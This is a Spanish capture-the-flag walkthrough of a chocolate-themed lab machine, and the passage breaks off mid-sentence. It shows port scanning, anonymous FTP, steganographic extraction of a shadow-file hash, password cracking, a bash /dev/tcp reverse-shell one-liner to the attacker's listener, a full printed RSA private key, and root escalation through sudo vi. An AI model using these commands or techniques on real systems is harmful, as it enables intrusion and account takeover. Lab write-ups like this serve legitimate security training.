@s4vitar\nâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.250.47 5 â”‚ [*] Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112, â”‚ 113,114,115,116,117,118,119,120,121,122,123,124,125 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.10.10 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1631bbfb51fcccc12148ff0d833b0089b (RSA) | 256 e71fc9dbj3eaa44b672103ceedb1d3390 (ECDSA) |_ 256 b44502b62478gea9065f6c79448a06555e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 100/tcp open newacct? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 101/tcp open hostname? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 102/tcp open iso-tsap? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 103/tcp open gppitnp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 104/tcp open acr-nema? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 105/tcp open csnet-ns? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 106/tcp open pop3pw? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 107/tcp open rtelnet? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 108/tcp open snagas? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 109/tcp open pop2? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 110/tcp open pop3? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 111/tcp open rpcbind? | fingerprint-strings: | NULL, RPCCheck: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 112/tcp open mcidas? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 113/tcp open ident? | fingerprint-strings: | DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: |_ http://localhost/key_rev_key \u0026lt;- You will find the key here!!! 114/tcp open audionews? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 115/tcp open sftp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 116/tcp open ansanotify? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 117/tcp open uucp-path? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 118/tcp open sqlserv? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 119/tcp open nntp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 120/tcp open cfdptkt? | fingerprint-strings: | GetRequest, HTTPOptions: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 121/tcp open erpc? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 122/tcp open smakynet? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 123/tcp open ntp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 124/tcp open ansatrader? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 125/tcp open locus-map? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 80 Con el whatweb podemos ver mÃ¡s informaciÃ³n de la web\nâ¯ whatweb 10.10.250.47 http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.47], PasswordField[password] Al entrar a la web hay un panel de login, e probado con admin:admin y las tÃ­picas credenciales pero nada.\nEl wappalayzer no reporta nada interesante.\nPuerto 21 El nmap reporto que se podÃ­a entrar al puerto 21 como anÃ³nimo (ftp-anon: Anonymous FTP login allowed)\nâ¯ ftp 10.10.250.47 Connected to 10.10.250.47. 220 (vsFTPd 3.0.3) Name (10.10.250.47:d3b0): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; Dentro solo hay una foto gum_room.jpg, con get gum_room.jpg nos la podemos pasar a nuestra mÃ¡quina, la foto es la siguiente:\nPara ver si hay algo oculto en la foto usamos steghide\nSteghide es un software de esteganografÃ­a de cÃ³digo abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.\nNo notarÃ¡s ningÃºn cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estarÃ¡ dentro de la imagen original o el archivo de audio. Es un software de lÃ­nea de comando.\n#Si no tienes instalado el \u0026#34;steghide\u0026#34; lo puedes descargar con sudo apt install steghide â¯ steghide extract -sf gum_room.jpg Anotar salvoconducto: anotï¿½ los datos extraï¿½dos e/\u0026#34;b64.txt\u0026#34;. Ahora se a creado un archivo b64.txt que estÃ¡ encriptado con base64\ncat b64.txt | base64 -d \u0026gt; decode.txt Ahora en el decode.txt ya estÃ¡ el contenido\n... ... charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::: Esto parece ser el /etc/shadow\nEl fichero /etc/shadow almacena las contraseÃ±as de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene informaciÃ³n sobre las contraseÃ±as de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto\nAl final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)\nPara romper el hash vamos a usar John the Ripper, que es una herramienta para recuperaciÃ³n de contraseÃ±as. Originalmente desarrollado para el sistema operativo Unix\nsudo apt install john echo \u0026#34;hash\u0026#34; \u0026gt; myhash.hash john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash john --show mihash.hash home.php Esto nos devuelve el usuario charlie con la contraseÃ±a, al probarlos en la web, nos lleva a otra pÃ¡gina.\nDesde aquÃ­ se pueden ejecutar comandos a la mÃ¡quina vÃ­ctima.\nReverse shell Primero nos ponemos en escucha por el puerto 443\nnc -nlvp 443 Intentamos crear una reverse shell mandando bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1, pero no recibimos nada, probamos aÃ±adiendo (bash -c \u0026ldquo;\u0026rdquo;) de tal forma que quede asÃ­ bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot; Ahora ya si\nTratamiento de la tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada a charlie En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahÃ­ hay una RSA private key.\nUna llave RSA es una llave generada por el algoritmo RSA. Esta llave estÃ¡ compuesta por dos partes, una parte pÃºblica y otra parte privada.\nDesde nuestra mÃ¡quina guardamos esa key en un archivo llamado id_rsa\nâ¯ cat id_rsa â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: id_rsa â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ -----BEGIN RSA PRIVATE KEY----- 2 â”‚ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 3 â”‚ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb 4 â”‚ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj 5 â”‚ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY 6 â”‚ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE 7 â”‚ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej 8 â”‚ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 9 â”‚ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF 10 â”‚ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl 11 â”‚ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ 12 â”‚ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 13 â”‚ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T 14 â”‚ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF 15 â”‚ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA 16 â”‚ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ 17 â”‚ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 18 â”‚ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB 19 â”‚ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB 20 â”‚ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 21 â”‚ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 22 â”‚ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv 23 â”‚ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb 24 â”‚ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM 25 â”‚ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm 26 â”‚ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln 27 â”‚ -----END RSA PRIVATE KEY----- â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora nos podemos conectar por ssh como charlie\nssh -i id_rsa charlie@10.10.94.87 Ya somos charlie y podemos ver la flag de usuario\nEscalada root Con sudo -l podemos ver todos los comandos que charlie puede ejecutar. AhÃ­ podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseÃ±a\nvi (Visual) es un programa que entra en la categorÃ­a de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cÃ³mo quedarÃ¡ el documento impreso. Por esto carece de opciones como centrado o justificaciÃ³n de pÃ¡rrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir cÃ³digo.\nEjecutar vi como root\nsudo vi\nctrl + c\nY por Ãºltimo escribir :shell en la linea de abajo\n:shell\nÂ¡Ya somos root!\nroot.py (Puertos 100 - 125) En el directorio /root hay un archivo llamado root.py el cual al ejecutarlo pyhton root.py pide una key: Volviendo al nmap que encontrÃ³ 25 puertos tcp en los cuales todos pone lo mismo:\n\u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; Menos uno, el 113, que pone:\nhttp://localhost/key_rev_key \u0026lt;- You will find the key here!!! Cuando entramos al http://10.10.94.87/key_rev_key nos descarga un archivo llamado key_rev_key, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc\u0026hellip; pero 